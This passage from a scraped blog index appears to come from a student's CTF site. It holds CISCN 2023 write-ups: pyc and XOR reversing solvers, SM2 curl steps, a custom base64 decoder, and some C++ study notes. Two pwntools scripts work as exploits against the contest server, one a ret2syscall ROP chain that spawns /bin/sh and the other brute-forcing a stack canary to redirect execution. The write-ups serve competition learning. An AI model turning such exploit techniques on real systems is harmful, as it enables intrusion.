2023","permalink":"/tags/pyc%E9%80%86%E5%90%91/","section":"Tags","summary":"","title":"pyc逆向"},{"content":"","date":"July 5, 2023","permalink":"/tags/reverse/","section":"Tags","summary":"","title":"reverse"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r直接将程序拖入IDA，shift+F12查看字符串，即可看到 flag ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/4_lazy-puts_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"reverse-Lazy Puts"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r下载题目附件后发现是pyc程序，所以我们先将pyc程序用在线网站反编译为python代码， pyc文件反编译在线网站： https://www.lddgo.net/string/pyc-compile-decompile 反编译后的代码：\n# uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.6.12 (default, Feb 9 2021, 09:19:15) # [GCC 8.3.0] # Embedded file name: code.py # Compiled at: 2023-04-07 02:35:04 # Size of source mod 2**32: 2203 bytes import random nums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() num = int.from_bytes(flag, \u0026#39;big\u0026#39;) print(num) #flag1 = int(flag.decode()) flag1 = num.to_bytes( 128,\u0026#39;big\u0026#39;,signed = True) print(flag1) random.seed(num) for i in random.choices(nums, k=5): num ^= i else: if num == 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039: print(\u0026#39;Correct!\u0026#39;) else: print(\u0026#39;Wrong!\u0026#39;) 直接遍历所有的情况，跑一遍代码，再用正则表达式搜索符合条件的flag\nnums = [ 1978258991135969430907740146613972524912040387261480714498605437001413714048012005658525477720873, 1414825718139831310004497635022196603261545889510259032286492681850346322299057448961219349615261, 1471197358920577704193422061749330372697192144784994772676793648983411513291005358932035022769990, 1095683197289929480686106401204396721653343660344305230304481285071676149806630337393361064473668, 921996790539554852662428059590451844400982285998027884584784172033455291195472563692294712472587, 768317485525512263520758851945293018259735364080330793974615632236110541795950958118326437487430, 544753920998122166512884082722895849761507576602028192924568306511924098132295226512319060641414, 87332110670036340709881571180530351791609485922184989048968644870753368056574249836210523509408, 1814118338382323693695027271435064617570300757148890716598838416084005431401276422453072948468217, 173167855524690381585242463414043296161603028899449630118125665233261307593525601052121277962903, 1328135371287398682018843879095667300066820442500694217856944376268862978878503400394942612696705, 4117570442808647688572679335481780771481111770146336113621471687653134742713621695560054296991, 1082796078933455613148302349648071297360971195093615794573975199793058617865979195384327642949519, 173826967948894750523527810600302472460382287952334480452515236484202394368569860647033480131050, 1926148526062731853158569840732303453811005817255836633583274407431574365300550129320730364526148, 576041746074522799631445170591885928961808907043509779947155037770053968111847260719001641989712, 298331994482251759036663482326665150166062610449547071972614876214926600675927398653925319016398, 1052527421677696645993193213526505700609834956685120728698363944650278933100105702857853287655234] if __name__ == \u0026#39;__main__\u0026#39;: #flag = input(\u0026#39;Input your flag: \u0026#39;).strip().encode() #num = int.from_bytes(flag, \u0026#39;big\u0026#39;) num = 3777974786954196899113426690262802545626191500785179338842593781943714596052295548581660967940571319476154736949371450126516159039; for a1 in range(18): for a2 in range (18): for a3 in range(18): for a4 in range(18): for a5 in range(18): num ^= nums[a1] num ^= nums[a2] num ^= nums[a3] num ^= nums[a4] num ^= nums[a5] flag1 = int.to_bytes(num, 54,\u0026#39;big\u0026#39;,signed = True) #if(flag1[0]==\u0026#39;W\u0026#39;): print(flag1) *小技巧：可以在Ubuntu虚拟机上先输入命令：\nscript -f log.txt #script工具，可以记录shell终端的内容到文件中 然后再运行代码，得到一个245MB的txt文件（有亿点点大） 直接在虚拟机终端或是记事本进行正则表达式匹配都可能会使进程卡死， 所以将该txt文件拖入地表较强的编辑器010editor中，在正则表达式匹配， 得到flag\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/5_oh-my-python_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"reverse-Oh My Python"},{"content":"","date":"July 5, 2023","permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"磁盘取证"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"古典密码学"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%B5%81%E9%87%8F%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"流量取证"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/","section":"Tags","summary":"","title":"栈溢出"},{"content":"Believe it or not , this is just a **test **. [doge]\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\rYou cannot see me unless you\u0026rsquo;ve got the password! # This is the content you want to encrypt!\nDo remember to close the hugo-encryptor shortcodes tag:\n","date":"July 4, 2023","permalink":"/posts/wp/2023_04_ctf/111/","section":"Posts","summary":"\u003cp\u003eBelieve it or not , this is just a **test **. [doge]\u003c/p\u003e","title":"An Encrypted Post"},{"content":"Hi！你好呀！\n欢迎来到我的博客小站！\n这里是ta0lve , 一名普通的在校大学生。\n关于我 # pwn新手，还在学习的征途中 常常和舍友一起打CTF，负责pwn\u0026amp;reverse\u0026amp;Crypto，也会打一打misc 网安专业在读准大二，二进制安全爱好者 不午休星人，常年中午不回宿舍，随机出现在实验室、教学楼、图书馆，晚上8点还可能出现在四百米跑道上 啥都想学，啥都想试：信安，开发，机器学习，数学建模\u0026hellip; 喜欢中土世界，n刷《魔戒》，高中时连续几天读完《精灵宝钻》 国际象棋爱好者，四国军棋爱好者 半个二次元，n刷《冰菓》、《你的名字》、《声之形》，为了看《罗小黑》和《风灵玉秀》加入了长生宗天天泡枸杞 关于博客 # 此博客搭建于2023年7月2日，希望能够在这个blog里记录自己的学习过程与思考，希望自己能和这个blog一起成长\n此博客分为以下几个部分（可以看看博客的右上角）\n归档 Posts：所有的博客文章都在此归档，部分文章有加密（前端有点简陋，主要是懒得改😴） 分类 Categories：一些大的方向上的文章分类，如CTF笔记、WP、编程语言的学习、生活记录等 标签 Tags：通过某些关键词来寻找相关的文章，如查看与pwn、reverse、栈溢出这些相关的文章 友链 link：一些优秀师傅、朋友的博客链接，方便大家去围观大佬博客 Point：借用了C语言里指针的名字，其实只是自己在学习途中参考的一些大佬的博客，会将所看的大佬的博客文章链接放在里面，就当是书签与学习记录了。还会放一些自己常用的在线工具\u0026amp;在线网站，方便以后自己快速找到 About：即本页面，简单介绍一下自己与这个博客 搜索框：可以搜索本博客的文章内容（位于博客界面的右上角） 小太阳/月亮标志：点击转换白天和黑夜模式（位于博客界面的右上角） ","date":"July 2, 2023","permalink":"/about/","section":"","summary":"Hi！你好呀！ 欢迎来到我的博客小站！ 这里是ta0lve , 一名","title":""},{"content":" Dalaos： # GZTime # Walking on the Time Axis.\nTEL # Web king !\nweyung # a Crypto CTFer\nMy friends： # Pazuris # a nice Weber and a nice friend\n","date":"July 2, 2023","permalink":"/link/","section":"","summary":"Dalaos： # GZTime # Walking on the Time Axis.\nTEL # Web king !\nweyung # a Crypto CTFer\nMy friends： # Pazuris # a nice Weber and a nice friend","title":""},{"content":"以下为2023信安国赛初赛的pwn，reverse和Crypto的部分题\npwn-烧烤摊儿 # from pwn import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) # 通过负数来增加自己的钱的数量，使得之后有足够的钱来承包烧烤摊 taolve.sendline(b\u0026#34;-100000\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;4\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;5\u0026#34;) # 一些可能会用到的rop的地址 # 使用 ROPgadget 工具 pop_rdi_ret = 0x040264f pop_rdi = 0x040264f pop_rsi = 0x0040a67e pop_rdx_rbx = 0x04a404b pop_rax = 0x00458827 ret = 0x040101a # 我们填写的name的地址，可以直接在ida上得到 name = 0x04E60F0 # 将/bin/sh字符串写到name的地址 payload = b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;a\u0026#34; * 31 + b\u0026#34;d\u0026#34; # 构造syscall ROP链（经典的ret2syscall解法） payload += p64(ret) + p64(pop_rax) + p64(0x3b) payload += p64(pop_rdx_rbx) + p64(0x0) + p64(1) + p64(pop_rdi) + p64(name) payload += p64(pop_rsi) + p64(0x0) + p64(0x45A066) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(payload) taolve.interactive() pwn-funcanary # from pwn import * import struct is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) # canary的最后一个字节固定为\\x00 canary = b\u0026#39;\\x00\u0026#39; # 检验我们填充的 padding 的长度是否正确 taolve.send(b\u0026#39;a\u0026#39; * 104 + canary) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: print(\u0026#34;ok\u0026#34;) # 拖到ida查看，可以看到fork函数， # fork函数相当于是在不断的进行一个自我复制，所以每一次复制出来的程序的canary值也是一样。 # 我们可以进行一个逐位的爆破，如果程序异常退出没有打印“have fun”，就说明这一位不对， # 如果程序正常，打印了“have fun”，就可以接着跑下一位 # 所以我们循环7次来爆破出canary的前7位字节 for j in range(7): for i in range(0x100): taolve.send(b\u0026#39;a\u0026#39; * 104 + canary + struct.pack(\u0026#39;B\u0026#39;, i)) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: canary += struct.pack(\u0026#39;B\u0026#39;, i) break print(\u0026#34;canary \u0026#34;.encode(\u0026#39;utf-8\u0026#39;) + canary) # ida 上可以看到后门函数的地址是0x01229 # 程序开了PIE保护，不过最后三位的地址时不变的 # 所以我们覆盖返回地址时可以直接覆盖第一个十六进制位为\\x31, # 而第二个十六进制位则可以采用爆破的方式 backdoor = b\u0026#34;\\x31\u0026#34; for j in range(1): for i in range(0x100): backdoor1 = backdoor + struct.pack(\u0026#39;B\u0026#39;, i) payload = b\u0026#39;a\u0026#39; * 104 + canary + b\u0026#39;a\u0026#39; * 8 + backdoor1 taolve.send(payload) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;flag\u0026#39; in a: # 当接收到flag字符串时程序停止 pause() taolve.interactive() reverse-babyre # 先在网站打开题目发过来的xml项目，看到代码块，将代码块翻译成c++代码\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; cin \u0026gt;\u0026gt; flag; for (int i = 0; i \u0026lt; flag.length(); i++) { int tmp; if (i == 0) { tmp = (int)flag[i] ^ 0; } else { tmp = (int)flag[i] ^ (int)flag[i - 1]; } test.push_back(tmp); } if (test.size() == secret.size()) { bool is_ok = true; for (int i = 0; i \u0026lt; test.size(); i++) { int item = test[i]; int b = secret[i]; if (item\u0026lt;b || item\u0026gt;b) { is_ok = false; } } if (is_ok) { cout \u0026lt;\u0026lt; \u0026#34;well done!\u0026#34;; } } return 0; } 对应写出re脚本\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; string flagchars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}\u0026#34;; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; int index = 0; for (int i = 0; i \u0026lt; secret.size(); i++) { for(int j = 0;j\u0026lt;flagchars.size();j++){ int tmp = 0; if (index == 0) { tmp = int(flagchars[j]) ^ 0; } else { tmp = int(flagchars[j]) ^ flag[index - 1]; } if (tmp == secret[index]) { flag += flagchars[j]; index++; break; } } } cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; return 0; } 运行脚本得到flag\nCrypto-基于国密SM2算法 # 直接照着文档一步一步的走即可，用到了两个在线网站：\nhttps://const.net.cn/tool/sm2/genkey/\n第一个网站用来生成SM2密钥 https://the-x.cn/cryptography/Sm2.aspx\n第二个网站用来在线加解密SM2算法和SM4算法\n先在在线网站 https://const.net.cn/tool/sm2/genkey/ 上生成SM2密钥： my_private_key F68AC4F1AEA7F95390B1B485661B9A226B701553A5BB6BD200079887B0C2BAF5 my_public key 97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE 1041E1739D4ED46423714230B1800723993E8E457D95BC28 然后全程跟着文档走： pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;name=my_name\u0026amp;school=my_school\u0026amp;phone=my_tel\u0026#34; http://39.106.48.123:35153/api/login { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;publicKey=97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE1041E1739D4ED46423714230B1800723993E8E457D95BC28\u0026#34; http://39.106.48.123:35153/api/allkey { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;eaa50cc1302292a8b7930c81737af202cf646acc4998c55dec8912a0ec41e7eb\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;52ed9891b127e04726b0244ff388da3d61dfff8eb15c99ec6cf108d0a24429f23a63037ae215945d59720287e87703c2d95cf2a92099b22b02db08d292c1909c2c44e778efb0d8b765141444ee03e7f890b5bc9daa36c03d67abf97fe5d0563060fc557ccac0aae284a35232f007a62b\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/quantumm { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;quantumString\u0026#34;: \u0026#34;64b8fe642b52996eaa5ec41e9a2b170e4ef88d9c5090cb47b5131ff5ac734be544df579ef61e8664a24d1f0851152a092ea4f192a53593412cb298d2ccb40d4bfd9e9262eccf77fb79f0fcc4479b340ee9357e180a22c92912c6026e08dd23078e4a170e1a9683118dd74e470ce71034\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;quantumString=E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34; http://39.106.48.123:35153/api/check { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: \u0026#34;结果正确，请访问 /api/search获取您的 flag\u0026#34; } pwner@pwner-virtual-machine:~/桌面/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/searchh { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;my_nmae\u0026#34;, \u0026#34;school\u0026#34;: \u0026#34;my_school\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;my_tel\u0026#34;, \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;d0b086d584bd7e8ec07bfe6e05074ca557dbfa3693cbdaf7d13705865fa05a4e\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;7faca1be2a892b48a539893fb0bf9b60\u0026#34;, \u0026#34;quantumStringServer\u0026#34;: \u0026#34;e05df0b168b718eee6f7b6d1d93ace09\u0026#34;, \u0026#34;quantumStringUser\u0026#34;: \u0026#34;E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;已完成考题，结果正确:flag{51035652-8117-44a0-9830-25ba73503def}\u0026#34; } }pwner@pwner-virtual-machine:~/CTF$ Crypto-Sign_in_passwd # flag文件里有两行字符串，\nj2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D\nGHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5\n观察后推测第一行是类似base64编码后的密文， 第二行有 “%”，推测是进行了url编码\n第一行字符串不能直接用欧通的base64解码，也不能用base91、base92等，\n而第二行url解码之后是：\nGHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5 可以看这一个字符串是base64码表的乱序，\n推测是以第二行字符串为新的码表来对第一行进行解码得到flag\n由于“=”号在码表中间，所以把最后面的5当作是原来的“=”号，\n可以直接自己写一个base64解码脚本，也可以直接上网搜base64解码脚本再修改码表\n# 改变后的码表 s = \u0026#34;GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF\u0026#34; def base64_changed_decode(inputs): # 将字符串转化为2进制 bin_str = [] for i in inputs: if i != \u0026#39;5\u0026#39;: x = str(bin(s.index(i))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;) bin_str.append(\u0026#39;{:0\u0026gt;6}\u0026#39;.format(x)) # print(bin_str) # 输出的字符串 outputs = \u0026#34;\u0026#34; nums = inputs.count(\u0026#39;=\u0026#39;) while bin_str: temp_list = bin_str[:4] temp_str = \u0026#34;\u0026#34;.join(temp_list) # print(temp_str) # 补足8位字节 if (len(temp_str) % 8 != 0): temp_str = temp_str[0:-1 * nums * 2] # 将四个6字节的二进制转换为三个字符 for i in range(0, int(len(temp_str) / 8)): outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2)) bin_str = bin_str[4:] print(\u0026#34;Decrypted String:\\n%s \u0026#34; % outputs) input_str = input(\u0026#34;Please enter a string that needs to be decrypted: \\n\u0026#34;) base64_changed_decode(input_str) \u0026#34;\u0026#34;\u0026#34; 输出： Please enter a string that needs to be decrypted: j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D Decrypted String: flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4} \u0026#34;\u0026#34;\u0026#34; ","date":"June 30, 2023","permalink":"/posts/wp/2023_06_ciscn/","section":"Posts","summary":"以下为2023信安国赛初赛的pwn，reverse和Cryp","title":"2023 ciscn 初赛"},{"content":"","date":"June 30, 2023","permalink":"/categories/c++/","section":"Categories","summary":"","title":"C++"},{"content":" cin与cout # 第一周T8，T9，T10\n下面语句的输出是？\n1. std::cout\u0026lt;\u0026lt;0+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 12.34\\n12.34 std::cout\u0026lt;\u0026lt;1+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 2.34\\n12.34 std::cout\u0026lt;\u0026lt;8+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // Q)@@u@12.56 std::cout\u0026lt;\u0026lt;9+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // Q)@@u@12.56 std::cout\u0026lt;\u0026lt;11+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 无输出？？？ std::cout\u0026lt;\u0026lt;12+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // )@@u@12.56 2. std::cout\u0026lt;\u0026lt;\u0026#39;a\u0026#39;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // a\\n12.34 std::cout\u0026lt;\u0026lt;0+\u0026#39;a\u0026#39;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 97\\n12.34 std::cout\u0026lt;\u0026lt;9+\u0026#34;a\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // z(@@u@\\n12.34 // 字符可以被自动转换成数字，而字符串则是输出其第n个字符开始的字符串（不自动转换） 3. int a=1; std::cin\u0026gt;\u0026gt;a; std::cout\u0026lt;\u0026lt;a; char b=\u0026#39;c\u0026#39;; //*1 std::cin\u0026gt;\u0026gt;b; std::cout \u0026lt;\u0026lt; b; //输入为a输出为0，提前赋值也是0， //原理是赋值时出现了异常 //a依然在缓存区里面，使得后面的b没有输入值，在*1处加上： cin.clear(); cin.ignore(); //cin().clear用来更改cin状态标示符； //cin.ignore(a,ch)方法是从输入流（cin）中提取字符，提取的字符被忽略（ignore），不被使用; //这两个函数搭配使用可以将缓存区的数据提取出来并丢弃； 第一周T17： #include\u0026lt;iostream\u0026gt; using namespace std; int main(){ int cout; cin\u0026gt;\u0026gt;cout; cout\u0026lt;\u0026lt;cout; } //无输出,编译运行正常，改为： //std::cout\u0026lt;\u0026lt;cout; //就可以输出 1 第一周T19： std::cout\u0026lt;\u0026lt;(cout\u0026lt;\u0026lt;cout); //输入： 输出： //1 2 0001 - 0010 //2 4 0010 - 10 00 //3 24 0011 - 11 000 //4 64 0100 - 100 0000 //5 160 0101 - 0101 00000 std::cout\u0026lt;\u0026lt;cout\u0026lt;\u0026lt;cout; //1 11 //2 22 //5 55 this指针 const与constexpr # 第二周 T2\n1.成员函数声明为const，就相当于this指针设为了const，从而达到无法修改对象的作用\n2.静态成员函数没有this指针，在没有创建任何对象时也能调用静态成员函数\n3.友元函数内没有this指针？\n1.引用就是某一变量（目标）的一个别名，对引用的操作与对变量直接操作完全一样(正确) 2. #include\u0026lt;iostream\u0026gt; using namespace std; int main() { int a=1; int *b = \u0026amp;a; int **c = \u0026amp;b; int ***d = \u0026amp;c; int ****e = \u0026amp;d; int *****f = \u0026amp;e; cout\u0026lt;\u0026lt; f \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; e \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl\u0026lt;\u0026lt; b; } //输出： 0x61fdf0 0x61fdf8 0x61fe00 0x61fe08 0x61fe14 3. constexpr 是 C++11 标准新添加的关键字，并建议将 const 和 constexpr 的功能区分开，即凡是表达“只读”语义的场景都使用 constexpr，表达“常量”语义的场景都使用 const (错误) 应该是： C++ 11标准中，为了解决 const 关键字的双重语义问题，保留了 const 表示“只读”的语义，而将“常量”的语义划分给了新添加的 constexpr 关键字。 因此 C++11 标准中，建议将 const 和 constexpr 的功能区分开，即凡是表达“只读”语义的场景都使用 const，表达“常量”语义的场景都使用 constexpr。 const 表示“只读”的语义，一般不更改 constexpr 表示“常量” 4. W2 T11： void dis_1(const int x){ array \u0026lt;int,x\u0026gt; myarr{1,2,3,4,5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } void dis_2(){ const int x = 5; array \u0026lt;int,x\u0026gt; myarr{1,2,3,4,5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } int main() { dis_1(5); dis_2(); } dis_1()运行出错，dis_2()能够正常运行 5.关于语句(1)和语句(2)，说法正确的是： （1）const int a = 5 + 4; （2）constexpr int a = 5 + 4; (1)和(2)均正确 auto # 总述： auto的原理就是根据后面的值，来自己推测前面的类型是什么。\nauto的作用就是为了简化变量初始化，如果这个变量有一个很长很长的初始化类型，就可以用auto代替。\n注意点： 1.用auto声明的变量必须初始化（auto是根据后面的值来推测这个变量的类型，如果后面没有值，自然会报错）\n2.函数和模板参数不能被声明为auto（原因同上）\n3.因为auto是一个占位符，并不是一个他自己的类型，因此不能用于类型转换或其他一些操作，如sizeof和typeid\n4.定义在一个auto序列的变量必须始终推导成同一类型\nauto x1 = 5, x2 = 5.0, x3=\u0026#39;r\u0026#39;; // This is too much....we cannot combine like this 示例： std::vector\u0026lt;std::string\u0026gt; ve; std::vector\u0026lt;std::string\u0026gt;::iterator it = ve.begin(); 我们可以用atuo来代替那个初始化类型： auto it = ve.begin(); 此外，如果是可用迭代器的对象的话，还可以这样操作： int main() { vector\u0026lt;int\u0026gt;v; v.push_back(1); v.push_back(2); v.push_back(3); for(auto i : v){ cout\u0026lt;\u0026lt;i\u0026lt;\u0026lt;\u0026#34; \u0026#34;; } cout\u0026lt;\u0026lt;endl; return 0; } auto在这里就是简单的替换了int类型。 W2 T16 下列关于auto的说法错误的是： A.使用auto声明的变量必须初始化 B.函数和模板参数不能被声明为auto C.因为auto是一个占位符，并不是一个他自己的类型，因此不能用于类型转换或其他一些操作，如sizeof和typeid D.定义在一个auto序列的变量不必始终推导成同一类型 (D) c++特性 # 1.C/C++面向对象开发的四大特性：封装、抽象、继承、多态\n2.在程序设计中，对于被抽象的数据，称为抽象数据类型（Abstract Data Type, ADT）\n3.类定义后必须跟着一个分号或一个声明列表。\n4.类声明里面public和private可以以任意顺序多次出现\n5.C++中同类的不同对象可以相互访问成员(包括私有成员)\n（比如在拷贝复制构造函数中）\n引用 # const常引用\nint x = 0; int \u0026amp;a = x; a += 10; const int \u0026amp;b = x； //b可以引用a，但是b只能读取x的值不能通过b去改变x的值。 static # 类中静态(static)成员不能在类的定义内初始化，要在类外再写类型 类名::变量名 = a 来初始化定义\nint 